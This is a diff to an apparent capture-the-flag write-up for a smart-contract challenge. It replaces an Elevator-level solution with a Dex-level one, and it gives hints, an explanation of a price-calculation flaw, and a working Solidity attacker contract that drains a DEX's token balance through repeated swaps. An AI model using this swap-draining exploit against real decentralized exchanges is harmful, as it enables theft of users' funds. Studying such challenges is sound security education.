@@ -10,32 +10,56 @@
 
 ### Hints
 
-- Shop expects to be used from a Buyer
-- Understanding restrictions of view functions
+- How is the price of the token calculated?
+- How does the swap method work?
+- How do you approve a transaction of an ERC20?
+- Theres more than one way to interact with a contract!
+- Remix might help
+- What does "At Address" do?
 
-- So when looking at the goTo function you see you need to fullfill two conditions at first `building.isLastFloor(_floor)` needs to return false to get into the if case then `building.isLastFloor(_floor)` needs to return true to assign the value true to `top` all of this needs to be called by a "building" so I made a contract that takes the elevator contract address as input and implements the Building interface, from that contract I can call the `elevator.goTo()` with an arbitrary uint, which then calls back to my hack contract which will set the number to 0 (my floorCounter) which then gets increased by one `floorCounter++;`, the 0 gets evaluated to false through my ternary operator, the second time `building.isLastFloor(_floor)` is getting called we assign the now increased floorCounter as the new number so now it will return true thus top = true
+- Basically the weakness is in the getSwapPrice function which calculates the "swap rate" by the amount of certain token inside the dex contract, since you can just swap 10 for 10 after that swap back 20 which will result in you getting 24 back since it now has calculates something like this `20 *(110/90)` if you repeate this process a few times the dex contract will at some point only have a balance of 45 tokens on one of the two tokens, then just trade 45 of this token for whatever you get back and you reached the goal to drain the contracts balance from 1 of the 2 token to zero.
 
 ### Attacker Contract
 
 ```solidity
 contract Hack {
-    Elevator public elevator;
-    Building public building;
-    uint private floorCounter;
+    IDex private immutable dex;
+    IERC20 private immutable token1;
+    IERC20 private immutable token2;
 
-    constructor(address _elevatorAddress) {
-        building = Building(address(this));
-        elevator = Elevator(_elevatorAddress);
+    constructor(IDex _dex) {
+        dex = _dex;
+        token1 = IERC20(_dex.token1());
+        token2 = IERC20(_dex.token2());
     }
 
-    function isLastFloor(uint _floor) external returns (bool) {
-        _floor = floorCounter;
-        floorCounter++;
-        return _floor == 0 ? false : true;
+    function hack() external {
+        // transfer to hack contract
+        token1.transferFrom(msg.sender, address(this), 10);
+        token2.transferFrom(msg.sender, address(this), 10);
+
+        // approve dex contract to handle tokens
+        token1.approve(address(dex), (2 ** 256 - 1));
+        token2.approve(address(dex), (2 ** 256 - 1));
+
+        // swap 5 times the max amount (balanceOf) + the last one with 45 tokens to drain token1 balance of the dex contract to 0
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+
+        dex.swap(address(token2), address(token1), 45);
+
+        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
     }
 
-    function attack() external {
-        elevator.goTo(1234);
+    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
+        dex.swap(
+            address(tokenIn),
+            address(tokenOut),
+            tokenIn.balanceOf(address(this))
+        );
     }
 }
 ```
